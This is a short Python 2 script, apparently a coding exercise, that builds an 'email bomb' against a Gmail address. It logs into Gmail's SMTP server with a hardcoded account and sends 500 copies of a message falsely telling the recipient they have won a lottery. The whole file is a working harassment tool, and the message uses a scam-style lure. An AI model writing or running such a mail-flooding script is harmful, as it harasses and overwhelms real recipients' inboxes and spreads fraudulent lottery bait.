'''
Make a Python script that sends an email to a Gmail User. 
Finally convert it to a bomb.
The script will qualify as a bomb if it is able to send 50 emails to the user. 
'''

import smtplib

def send_email():
    # Enter your login credentials below
    username = 'sendanonymous90'
    password = '*******'
    FROM = 'sendanonymous90@gmail.com'
    TO =  'receivetestmail@gmail.com '
    SUBJECT = 'TEST'
    TEXT = 'Hi there, you have received a lottery of 1000$.'
    
    message  = """From: %s\nTo: %s\nSubject: %s\n\n%s""" %(FROM, TO, SUBJECT, TEXT)    
    
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(username, password)
    
    count =0
    for i in range(500):
        server.sendmail(FROM, TO, message)
        print 'Success'
        count +=1
        print count 

    server.close()
    

send_email()

